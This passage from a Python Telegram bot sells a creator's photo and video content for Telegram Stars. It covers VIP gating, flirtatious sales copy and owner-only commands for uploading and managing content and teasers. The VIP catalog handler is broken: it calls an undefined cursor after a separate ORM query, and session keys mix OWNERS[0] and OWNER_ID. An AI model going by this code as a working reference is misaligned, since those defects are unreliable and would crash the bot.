✨ <b>VIP-Only Benefits:</b>
• Exclusive VIP content library
• Premium photos and videos
• Behind-the-scenes content
• Direct personal chat access
• Priority responses

🚀 Ready to upgrade and unlock everything?
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💎 Become a VIP", callback_data="vip_access"))
        markup.add(types.InlineKeyboardButton("🛒 Browse Regular Content", callback_data="browse_content"))
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
        
        bot.send_message(chat_id, no_vip_message, reply_markup=markup, parse_mode='HTML')
        return
    
    # User is VIP - show VIP content library
    with app.app_context():
        # Only show content marked as 'vip' type
        vip_content = ContentItem.query.filter_by(content_type='vip').all()
    vip_items = cursor.fetchall()
    conn.close()
    
    if vip_items:
        catalog_text = f"💎 <b>VIP EXCLUSIVE CONTENT </b> 💎\n\n"
        catalog_text += f"🎉 Welcome VIP member! Free access to all VIP content!\n"
        catalog_text += f"⏰ Your VIP expires in {vip_status['days_left']} days\n\n"
        catalog_text += f"📚 <b>{len(vip_items)} exclusive VIP items available:</b>\n\n"
        
        markup = types.InlineKeyboardMarkup()
        
        for name, price, description in vip_items:
            # Escape HTML special characters to prevent parsing errors
            safe_name = name.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            
            catalog_text += f"💎 <b>{safe_name}</b>\n"
            catalog_text += f"🆓 <b>VIP FREE ACCESS</b>\n"
            catalog_text += f"📝 {safe_description}\n\n"
            
            # Add free access button for VIP content
            markup.add(types.InlineKeyboardButton(f"💎 Access {name} (VIP FREE)", callback_data=f"vip_get_{name}"))
        
        # Add navigation buttons
        markup.add(types.InlineKeyboardButton("🛒 Browse Regular Content", callback_data="browse_content"))
        markup.add(types.InlineKeyboardButton(f"🔄 Extend VIP", callback_data="buy_vip"))
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
        
        bot.send_message(chat_id, catalog_text, reply_markup=markup, parse_mode='HTML')
    else:
        # No VIP content available
        no_content_message = f"""
💎 <b>VIP EXCLUSIVE CONTENT</b> 💎

🎉 Welcome VIP member!
⏰ Your VIP expires in {vip_status['days_left']} days

📂 <b>VIP Content Status:</b>
🚧 No exclusive VIP content available yet, but stay tuned!

More premium VIP content is being added regularly. Check back soon for exclusive releases!

💡 <b>Meanwhile:</b> You can still browse and purchase regular content.
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 Browse Regular Content", callback_data="browse_content"))
        markup.add(types.InlineKeyboardButton(f"🔄 Extend VIP", callback_data="buy_vip"))
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
        
        bot.send_message(chat_id, no_content_message, reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['help'])
def help_command(message):
    """Handle /help command"""
    add_or_update_user(message.from_user)
    
    help_text = """
🔥💋 **Ready to turn up the heat? Gigi Torres** 

**HOW TO INTERACT WITH THE BOT**

💬 **VIP Exclusive Chat:**
Want to get up close and personal? Only VIPs get direct access to me. Upgrade now and let’s make it extra special. 😘

⭐ **Telegram Stars:**
Use Telegram Stars to purchase my exclusive content.

🎯 **Quick Actions:**
Use the buttons below to navigate - no need to type commands!

💕 Got questions? Baby, just join the VIP. I see everything.
"""
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    # Row 1: Main actions
    markup.add(
        types.InlineKeyboardButton("🏠 VIPZone", callback_data="cmd_start"),
        types.InlineKeyboardButton("🎬 Free VIP Teasers", callback_data="cmd_teaser")
    )
    # Row 2: Shopping
    markup.add(
        types.InlineKeyboardButton("🛒 Content Showcase", callback_data="browse_content"),
        types.InlineKeyboardButton("💬 Contact Me", callback_data="ask_question")
    )
    # Row 3: My Content and VIP Library
    markup.add(
        types.InlineKeyboardButton("📂 My Content", callback_data="my_content"),
        types.InlineKeyboardButton("💎 VIP Collection", callback_data="vip_content_catalog")
    )
    # Row 4: VIP Teasers
    markup.add(types.InlineKeyboardButton("🎬 VIP Teasers", callback_data="vip_teasers_collection"))
    # Row 5: Help refresh
    markup.add(types.InlineKeyboardButton("🔄 Refresh Help", callback_data="cmd_help"))
    
    bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode='Markdown')

# Owner/Admin commands

@bot.message_handler(commands=['owner_add_content'])
def owner_add_content(message):
    """Handle /owner_add_content command with automatic URL processing"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    try:
        # Parse command: /owner_add_content [name] [price_stars] [file_path_or_url] [description]
        parts = message.text.split(' ', 4)
        if len(parts) < 4:
            help_text = """❌ Usage: /owner_add_content [name] [price_stars] [file_path_or_url] [description]

🔗 **URL Support:** External image URLs are automatically downloaded and converted to permanent Telegram file_ids!

📝 **Examples:**
• `/owner_add_content beach_photo 25 https://yyamen.com/image.jpg Beautiful beach sunset`
• `/owner_add_content vip_content 50 AgACAgIAAxkBAAI... Exclusive content`

💡 **Supported URLs:** Any direct image URL (JPG, PNG, GIF, WebP)"""
            bot.send_message(message.chat.id, help_text)
            return
        
        name = parts[1]
        price_stars = int(parts[2])
        file_path = parts[3]
        description = parts[4] if len(parts) > 4 else "Exclusive content"
        
        # Check if this name already exists
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        cursor.execute('SELECT name FROM content_items WHERE name = ?', (name,))
        existing = cursor.fetchone()
        conn.close()
        
        if existing:
            bot.send_message(message.chat.id, f"❌ Content with name '{name}' already exists! Choose a different name or use a different command to update it.")
            return
        
        # Process external URLs automatically
        processed_file_path = file_path
        file_type_info = ""
        
        if file_path.startswith('http'):
            # It's an external URL - download and convert to Telegram file_id
            bot.send_message(message.chat.id, f"🔗 External URL detected! Converting to permanent Telegram file_id...\n\n📥 URL: {file_path}")
            
            success, result, file_type = download_and_upload_image(file_path, message.chat.id)
            
            if success:
                processed_file_path = result  # This is now the Telegram file_id
                file_type_info = f"\n📁 File Type: {file_type.title()}"
                bot.send_message(message.chat.id, f"🎉 URL successfully converted to permanent Telegram file_id!\n\n🔄 Original URL: {file_path}\n✅ New File ID: {result[:50]}...")
            else:
                # Download failed - show error and don't save
                bot.send_message(message.chat.id, f"💥 URL Processing Failed!\n\n{result}\n\n🔍 **Troubleshooting:**\n• Verify the URL points directly to an image\n• Check if the site allows hotlinking\n• Try a different image URL\n• Upload the file manually instead")
                return
        
        # Save to database (with processed file_path)
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO content_items (name, price_stars, file_path, description, created_date, content_type)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (name, price_stars, processed_file_path, description, datetime.datetime.now().isoformat(), 'browse'))
        conn.commit()
        conn.close()
        
        # Success message with details
        success_message = f"""✅ **CONTENT ADDED SUCCESSFULLY!** ✅

📦 **Name:** {name}
💰 **Price:** {price_stars:,} Stars
📝 **Description:** {description}{file_type_info}
🔄 **File:** {"Telegram File ID (converted from URL)" if file_path.startswith('http') else "Direct Path/ID"}

🛒 **Ready for sale!** Fans can now purchase this content using:
• Browse Content menu
• `/buy {name}` command

💡 **Note:** {("Original URL was automatically converted to a permanent Telegram file_id to prevent hotlinking issues!" if file_path.startswith('http') else "File is ready for delivery!")}"""
        
        bot.send_message(message.chat.id, success_message, parse_mode='Markdown')
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid price! Please enter a number for Stars.\n\nExample: `/owner_add_content my_content 25 https://example.com/image.jpg Description here`")
    except Exception as e:
        logger.error(f"Error in owner_add_content: {e}")
        bot.send_message(message.chat.id, f"❌ Error adding content: {str(e)}\n\nPlease check your command format and try again.")

@bot.message_handler(commands=['owner_delete_content'])
def owner_delete_content(message):
    """Handle /owner_delete_content command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❌ Usage: /owner_delete_content [name]")
        return
    
    name = parts[1]
    
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM content_items WHERE name = ?', (name,))
    deleted_count = cursor.rowcount
    conn.commit()
    conn.close()
    
    if deleted_count > 0:
        bot.send_message(message.chat.id, f"✅ Content '{name}' deleted successfully!")
    else:
        bot.send_message(message.chat.id, f"❌ Content '{name}' not found.")

@bot.message_handler(commands=['owner_upload'])
def owner_upload_content(message):
    """Handle /owner_upload command - start guided upload flow"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    # Initialize upload session
    upload_sessions[OWNERS[0]] = {
        'step': 'waiting_for_file',
        'name': None,
        'price': None,
        'description': None,
        'file_path': None
    }
    
    upload_text = """
📤 <b>GUIDE FOR UPLOADING CONTENT</b> 📤

I'll help you upload new content step by step!

<b>Step 1:</b> Send me the file (photo, video, or document)
- Just upload/send the file directly to this chat
- Supported: Photos, Videos, Documents

After you send the file, I'll ask for the name, price, and description.

💡 <b>Tip:</b> You can also use /owner_add_content [name] [price] [url] [description] for web URLs.
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel Upload", callback_data="cancel_upload"))
    
    bot.send_message(message.chat.id, upload_text, reply_markup=markup, parse_mode='HTML')

@bot.message_handler(content_types=['photo', 'video', 'document', 'animation'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') not in ['teaser', 'vip_content', 'vip_teaser'] and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')
def handle_file_upload(message):
    """Handle file uploads for content creation (excludes teaser sessions)"""
    logger.info(f"General content handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(OWNER_ID, 'None')}")
    
    # Check if we're in any upload session
    if OWNER_ID not in upload_sessions or upload_sessions[OWNER_ID]['step'] != 'waiting_for_file':
        bot.send_message(message.chat.id, "📤 To upload content, start with `/owner_upload` or use VIP upload!")
        return
    
    # Get file info based on content type
    file_info = None
    file_type = ""
    
    if message.content_type == 'photo':
        file_info = bot.get_file(message.photo[-1].file_id)  # Get highest resolution
        file_type = "Photo"
    elif message.content_type == 'video':
        file_info = bot.get_file(message.video.file_id)
        file_type = "Video"
    elif message.content_type == 'animation':
        file_info = bot.get_file(message.animation.file_id)
        file_type = "GIF"
    elif message.content_type == 'document':
        file_info = bot.get_file(message.document.file_id)
        # Check if document is actually a video or gif
        if hasattr(message.document, 'file_name') and message.document.file_name:
            file_name = message.document.file_name.lower()
            if file_name.endswith(('.mp4', '.mov', '.avi', '.mkv', '.webm')):
                file_type = "Video"
            elif file_name.endswith(('.gif')):
                file_type = "GIF"
            elif file_name.endswith(('.jpg', '.jpeg', '.png', '.webp')):
                file_type = "Photo"
            else:
                file_type = "Document"
        else:
            # Check MIME type as fallback
            mime_type = getattr(message.document, 'mime_type', '')
            if mime_type.startswith('video/'):
                file_type = "Video"
            elif mime_type == 'image/gif':
                file_type = "GIF"
            elif mime_type.startswith('image/'):
                file_type = "Photo"
            else:
                file_type = "Document"
    
    if file_info:
        # Store file_id instead of download URL to avoid exposing bot token
        file_id = None
        if message.content_type == 'photo':
            file_id = message.photo[-1].file_id
        elif message.content_type == 'video':
            file_id = message.video.file_id
        elif message.content_type == 'animation':
            file_id = message.animation.file_id
        elif message.content_type == 'document':
            file_id = message.document.file_id
        else:
            bot.send_message(message.chat.id, "❌ Unsupported file type. Please send a photo, video, animation")
            return
        
        # Check if this is a VIP upload session
        session = upload_sessions[OWNERS[0]]
        if session.get('type') == 'vip_content':
            handle_vip_file_upload(message, file_id, file_type)
            return
        
        # Regular content upload
        upload_sessions[OWNER_ID]['file_path'] = file_id  # Store file_id instead of URL
        upload_sessions[OWNER_ID]['file_type'] = file_type
        upload_sessions[OWNER_ID]['step'] = 'waiting_for_name'
        
        # Ask for content name
        name_text = f"""
✅ **{file_type} uploaded successfully!**

<b>Step 2:</b> What should I call this content?
Type a unique name (no spaces, use underscores):

Example: beach_photoshoot_1 or exclusive_video_dec

This name will be used internally to identify the content.
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("❌ Cancel Upload", callback_data="cancel_upload"))
        
        bot.send_message(message.chat.id, name_text, reply_markup=markup, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions)
def handle_upload_flow(message):
    """Handle the guided upload flow steps"""
    if OWNERS[0] not in upload_sessions:
        return
    
    session = upload_sessions[OWNERS[0]]
    
    # Handle VIP upload flow
    if session.get('type') == 'vip_content':
        if session['step'] == 'waiting_for_name':
            handle_vip_name_input(message)
            return
        elif session['step'] == 'waiting_for_description':
            handle_vip_description_input(message)
            return
    
    # Handle VIP settings flow  
    if session.get('type') == 'vip_settings':
        if session['step'] == 'waiting_for_input':
            handle_vip_settings_input(message)
            return
    
    # Regular upload flow continues below
    
    if session['step'] == 'waiting_for_name':
        # Validate name (no spaces, alphanumeric + underscores)
        name = message.text.strip()
        if not name or ' ' in name or not all(c.isalnum() or c == '_' for c in name):
            bot.send_message(message.chat.id, "❌ Invalid name! Use only letters, numbers, and underscores (no spaces).\nExample: beach_photos_1")
            return
        
        # Check if name already exists
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        cursor.execute('SELECT name FROM content_items WHERE name = ?', (name,))
        existing = cursor.fetchone()
        conn.close()
        
        if existing:
            bot.send_message(message.chat.id, f"❌ Content with name '{name}' already exists! Choose a different name.")
            return
        
        session['name'] = name
        session['step'] = 'waiting_for_price'
        
        price_text = f"""
✅ <b>Name set:</b> {name}

<b>Step 3:</b> How much should this cost?
Enter the price in Telegram Stars (just the number):

Examples: 25, 50, 100

💡 Typical prices:
• Photo sets: 20-50 Stars
• Videos: 50-200 Stars
• Exclusive content: 100+ Stars
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("❌ Cancel Upload", callback_data="cancel_upload"))
        
        bot.send_message(message.chat.id, price_text, reply_markup=markup, parse_mode='HTML')
    
    elif session['step'] == 'waiting_for_price':
        try:
            price = int(message.text.strip())
            if price <= 0:
                bot.send_message(message.chat.id, "❌ Price must be a positive number!")
                return
            
            session['price'] = price
            session['step'] = 'waiting_for_description'
            
            desc_text = f"""
✅ <b>Price set:</b> {price:,} Stars

<b>Step 4:</b> Add a description (optional)
Write a short description that customers will see:

Example: "Exclusive behind-the-scenes photos from my latest shoot"

Or type skip to use a default description.
"""
            
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("⏭️ Skip Description", callback_data="skip_description"),
                types.InlineKeyboardButton("❌ Cancel Upload", callback_data="cancel_upload")
            )
            
            bot.send_message(message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')
            
        except ValueError:
            bot.send_message(message.chat.id, "❌ Invalid price! Enter just the number (e.g., 25)")
    
    elif session['step'] == 'waiting_for_description':
        description = message.text.strip()
        if description.lower() == 'skip':
            description = f"Exclusive {session.get('file_type', 'content').lower()} content"
        
        session['description'] = description
        
        # Save content to database
        save_uploaded_content(session)

def save_uploaded_content(session):
    """Save the uploaded content to database and finish the flow with automatic URL processing"""
    try:
        # Check if this is VIP content
        content_type = session.get('content_type', 'browse')
        
        # Process external URLs automatically before saving
        processed_file_path = session['file_path']
        file_type_info = ""
        url_conversion_note = ""
        
        if session['file_path'] and session['file_path'].startswith('http'):
            # It's an external URL - download and convert to Telegram file_id
            bot.send_message(OWNER_ID, f"🔗 External URL detected in guided upload! Converting to permanent Telegram file_id...\n\n📥 URL: {session['file_path']}")
            
            success, result, file_type = download_and_upload_image(session['file_path'], OWNER_ID)
            
            if success:
                processed_file_path = result  # This is now the Telegram file_id
                file_type_info = f" ({file_type.title()})"
                url_conversion_note = "\n\n🔄 **URL Conversion:** Original external URL was automatically converted to a permanent Telegram file_id to prevent hotlinking issues!"
                bot.send_message(OWNER_ID, f"🎉 URL successfully converted to permanent Telegram file_id!\n\n✅ New File ID: {result[:50]}...")
            else:
                # Download failed - notify user and don't save
                error_message = f"""💥 **URL Processing Failed!**

{result}

🔍 **What happened:** The external URL could not be downloaded and converted to a Telegram file_id.

📋 **Content Details:**
• Name: {session['name']}
• Price: {session['price']:,} Stars
• Description: {session['description']}
• Failed URL: {session['file_path']}

🛠️ **Next Steps:**
• Try uploading the file directly instead of using a URL
• Use a different image URL that allows downloading
• Check if the URL is accessible and points to an image file"""
                
                bot.send_message(OWNER_ID, error_message)
                
                # Clear upload session since we can't proceed
                if OWNERS[0] in upload_sessions:
                    del upload_sessions[OWNERS[0]]
                return
        
        # Save to database (with processed file_path)
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO content_items (name, price_stars, file_path, description, created_date, content_type)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (session['name'], session['price'], processed_file_path, session['description'], datetime.datetime.now().isoformat(), content_type))
        conn.commit()
        conn.close()
        
        # Success message
        if content_type == 'vip':
            success_text = f"""
💎 <b>VIP CONTENT ADDED SUCCESSFULLY!</b> 💎

📦 <b>Name:</b> {session['name']}
💰 <b>Price:</b> {session['price']:,} Stars
📝 <b>Description:</b> {session['description']}
📁 <b>Type:</b> {session.get('file_type', 'File')}{file_type_info} (VIP Exclusive)

🎉 Your VIP content is now live! VIP members get FREE access.
Non-VIP users can purchase VIP subscriptions to access this content.

💡 VIP content generates higher revenue through subscriptions!{url_conversion_note}
"""
        else:
            success_text = f"""
🎉 <b>CONTENT ADDED SUCCESSFULLY!</b> 🎉

📦 <b>Name:</b> {session['name']}
💰 <b>Price:</b> {session['price']:,} Stars
📝 <b>Description:</b> {session['description']}
📁 <b>Type:</b> {session.get('file_type', 'File')}{file_type_info}

Your content is now available for purchase! Fans can buy it using:
• The browse content menu
• /buy {session['name']} command

🛒 Content will be delivered automatically after payment.{url_conversion_note}
"""
        
        markup = types.InlineKeyboardMarkup()
        if content_type == 'vip':
            markup.add(types.InlineKeyboardButton("💎 Add More VIP Content", callback_data="start_vip_upload"))
            markup.add(types.InlineKeyboardButton("📊 VIP Dashboard", callback_data="cmd_vip"))
        else:
            markup.add(types.InlineKeyboardButton("📦 Add Another", callback_data="start_upload"))
            markup.add(types.InlineKeyboardButton("👥 View Users", callback_data="owner_list_users"))
        
        bot.send_message(OWNER_ID, success_text, reply_markup=markup, parse_mode='HTML')
        
        # Clear upload session
        if OWNERS[0] in upload_sessions:
            del upload_sessions[OWNERS[0]]
            
    except Exception as e:
        bot.send_message(OWNER_ID, f"❌ Error saving content: {str(e)}")
        if OWNERS[0] in upload_sessions:
            del upload_sessions[OWNERS[0]]

@bot.message_handler(commands=['owner_upload_vip_teaser'])
def owner_upload_vip_teaser(message):
    """Handle /owner_upload_vip_teaser command - guided VIP teaser upload flow"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    start_vip_teaser_upload_session(message.chat.id, message.from_user.id)

@bot.message_handler(commands=['owner_upload_teaser'])
def owner_upload_teaser(message):
    """Handle /owner_upload_teaser command - guided teaser upload flow"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    # Start teaser upload session
    upload_sessions[OWNERS[0]] = {
        'type': 'teaser',
        'step': 'waiting_for_file',
        'data': {}
    }
    
    upload_text = """
🎬 **TEASER UPLOAD** 🎬

📤 Send me the photo or video you want to use as a teaser.

This will be shown to non-VIP users when they use /teaser command.

💡 Tips:
• Upload high-quality images or short videos
• Keep it enticing but not revealing everything
• This builds anticipation for your full content

📱 Just send the file when ready!
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_teaser_upload"))
    
    bot.send_message(message.chat.id, upload_text, reply_markup=markup)

@bot.message_handler(content_types=['photo', 'video', 'animation'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')
def handle_vip_upload_files(message):
    """Handle VIP content file uploads - photos, videos, and animations only"""
    logger.info(f"VIP upload handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(OWNER_ID, 'None')}")
    
    # Get file information
    file_id = None
    file_type = None
    
    if message.content_type == 'photo':
        file_id = message.photo[-1].file_id  # Get highest resolution
        file_type = "Photo"
    elif message.content_type == 'video':
        file_id = message.video.file_id
        file_type = "Video"
    elif message.content_type == 'animation':
        file_id = message.animation.file_id
        file_type = "GIF"
    
    if file_id and file_type:
        handle_vip_file_upload(message, file_id, file_type)
    else:
        bot.send_message(message.chat.id, "❌ Unsupported file type for VIP content. Please send photos, videos, or GIFs only.")

@bot.message_handler(content_types=['photo', 'video', 'animation'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_file_update' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')
def handle_vip_file_update_upload(message):
    """Handle VIP file update uploads - replace existing file"""
    logger.info(f"VIP file update handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(OWNER_ID, 'None')}")
    
    # Get file information
    file_id = None
    file_type = None
    
    if message.content_type == 'photo':
        file_id = message.photo[-1].file_id  # Get highest resolution
        file_type = "Photo"
    elif message.content_type == 'video':
        file_id = message.video.file_id
        file_type = "Video"
    elif message.content_type == 'animation':
        file_id = message.animation.file_id
        file_type = "GIF"
    
    if file_id and file_type:
        session = upload_sessions[OWNERS[0]]
        content_name = session['content_name']
        
        # Update the VIP content file path directly
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('UPDATE content_items SET file_path = ? WHERE name = ? AND content_type = ?', 
                      (file_id, content_name, 'vip'))
        updated_count = cursor.rowcount
        conn.commit()
        conn.close()
        
        # Clear upload session
        del upload_sessions[OWNERS[0]]
        
        if updated_count > 0:
            success_text = f"""
✅ <b>FILE UPDATED SUCCESSFULLY!</b> ✅

<b>VIP Content:</b> {content_name}
<b>New File:</b> {file_type}

🎉 The file has been replaced and VIP members will now see the new content!
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("✏️ Edit Content Again", callback_data=f"vip_edit_{content_name}"))
            markup.add(types.InlineKeyboardButton("📋 Back to VIP Management", callback_data="vip_manage_content"))
            
            bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, f"❌ Failed to update file for '{content_name}'. Please try again.")
    else:
        bot.send_message(message.chat.id, "❌ Unsupported file type for VIP content. Please send photos, videos, or GIFs only.")

@bot.message_handler(content_types=['photo', 'video'], func=lambda message: message.from_user.id == OWNER_ID and f"{OWNER_ID}_vip_teaser" in upload_sessions and upload_sessions[f"{OWNER_ID}_vip_teaser"].get('type') == 'vip_teaser' and upload_sessions[f"{OWNER_ID}_vip_teaser"].get('step') == 'waiting_for_file')
def handle_vip_teaser_upload(message):
    """Handle VIP teaser file upload from owner"""
    teaser_key = f"{OWNER_ID}_vip_teaser"
    logger.info(f"VIP teaser handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(teaser_key, 'None')}")
    session = upload_sessions[teaser_key]
    
    if session['step'] == 'waiting_for_file':
        # Store file information
        file_id = None
        file_type = None
        
        if message.photo:
            file_id = message.photo[-1].file_id  # Get highest resolution
            file_type = 'photo'
            session['file_type'] = 'photo'
        elif message.video:
            file_id = message.video.file_id
            file_type = 'video'
            session['file_type'] = 'video'
        
        if file_id and file_type:
            # Store file info and move to description step
            session['file_path'] = file_id
            session['step'] = 'waiting_for_description'
            
            # Generate default name with timestamp
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            default_name = f"vip_{file_type}_{timestamp}"
            session['name'] = default_name
            
            desc_text = f"""
✅ <b>VIP TEASER FILE RECEIVED!</b> ✅

📱 <b>File Type:</b> {file_type.title()}
🎯 <b>Default Name:</b> {default_name}

📤 <b>Step 2: Description</b>
Now send me a description for this VIP teaser (optional).

💡 <b>Description Tips:</b>
• Make it exclusive and enticing for VIP members
• Use personal language ("Just for my VIPs...")
• Keep it engaging but not too long

📝 Send your description or click "Skip" to use no description.
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⏭ Skip Description", callback_data="skip_vip_teaser_description"))
            markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="vip_teasers_management"))
            
            bot.send_message(message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, "❌ Please send a photo or video file for the VIP teaser.")

@bot.message_handler(content_types=['photo', 'video'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_teaser_edit' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')
def handle_vip_teaser_edit_upload(message):
    """Handle VIP teaser edit file upload from owner"""
    session = upload_sessions[OWNERS[0]]
    
    # Store new file information
    file_id = None
    file_type = None
    
    if message.photo:
        file_id = message.photo[-1].file_id
        file_type = 'photo'
    elif message.video:
        file_id = message.video.file_id
        file_type = 'video'
    
    if file_id and file_type:
        # Update the teaser in database
        try:
            conn = sqlite3.connect('content_bot.db')
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE teasers 
                SET file_path = ?, file_type = ? 
                WHERE id = ? AND vip_only = 1
            ''', (file_id, file_type, session['teaser_id']))
            conn.commit()
            conn.close()
            
            success_text = f"""
✅ <b>VIP TEASER UPDATED SUCCESSFULLY!</b> ✅

🎬 <b>New Type:</b> {file_type.title()}
📝 <b>Description:</b> {session['old_description']}

💎 Your VIP teaser has been updated! VIP members will now see the new content.
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("✏️ Edit Another", callback_data="vip_teaser_edit"))
            markup.add(types.InlineKeyboardButton("🔙 Back to VIP Teasers", callback_data="vip_teasers_management"))
            
            bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')
            
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error updating VIP teaser: {str(e)}")
        
        # Clear upload session
        if OWNERS[0] in upload_sessions:
            del upload_sessions[OWNERS[0]]
    else:
        bot.send_message(message.chat.id, "❌ Please send a photo or video file for the VIP teaser.")

@bot.message_handler(content_types=['photo', 'video', 'document', 'animation'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'teaser' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')
def handle_teaser_upload(message):
    """Handle teaser file upload from owner"""
    logger.info(f"Teaser handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(OWNER_ID, 'None')}")
    session = upload_sessions[OWNERS[0]]
    
    if session['step'] == 'waiting_for_file':
        # Store file information
        file_id = None
        file_type = None
        
        if message.photo:
            file_id = message.photo[-1].file_id  # Get highest resolution
            file_type = 'photo'
            session['file_type'] = 'photo'
        elif message.video:
            file_id = message.video.file_id
            file_type = 'video'
            session['file_type'] = 'video'
        elif message.animation:
            file_id = message.animation.file_id
            file_type = 'gif'
            session['file_type'] = 'gif'
        elif message.document:
            file_id = message.document.file_id
            # Detect actual file type for documents
            if hasattr(message.document, 'file_name') and message.document.file_name:
                file_name = message.document.file_name.lower()
                if file_name.endswith(('.mp4', '.mov', '.avi', '.mkv', '.webm')):
                    file_type = 'video'
                    session['file_type'] = 'video'
                elif file_name.endswith(('.gif')):
                    file_type = 'gif'
                    session['file_type'] = 'gif'
                elif file_name.endswith(('.jpg', '.jpeg', '.png', '.webp')):
                    file_type = 'photo'
                    session['file_type'] = 'photo'
                else:
                    file_type = None  # Unsupported document type
            else:
                # Check MIME type as fallback
                mime_type = getattr(message.document, 'mime_type', '')
                if mime_type.startswith('video/'):
                    file_type = 'video'
                    session['file_type'] = 'video'
                elif mime_type == 'image/gif':
                    file_type = 'gif'
                    session['file_type'] = 'gif'
                elif mime_type.startswith('image/'):
                    file_type = 'photo'
                    session['file_type'] = 'photo'
                else:
                    file_type = None  # Unsupported document type
        
        if file_id and file_type:
            session['file_id'] = file_id
            session['step'] = 'waiting_for_description'
        else:
            bot.send_message(message.chat.id, "❌ Please send a photo, video, or GIF file. Supported formats: JPG, PNG, MP4, GIF, MOV, AVI.")
            return
        
        # Ask for description
        desc_text = f"""
✅ **{file_type.title()} received!**

📝 Now send me a description for this teaser (what fans will see):

Examples:
• "Behind the scenes sneak peek 😉"
• "A little taste of what's coming..."
• "Can't wait to show you the full version 💕"

Type your description:
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⏭ Skip Description", callback_data="skip_teaser_description"))
        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_teaser_upload"))
        
        bot.send_message(message.chat.id, desc_text, reply_markup=markup)

@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_name')
def handle_vip_name_message(message):
    """Handle VIP content name input from message"""
    handle_vip_name_input(message)

@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_description')
def handle_vip_description_message(message):
    """Handle VIP content description input from message"""
    handle_vip_description_input(message)

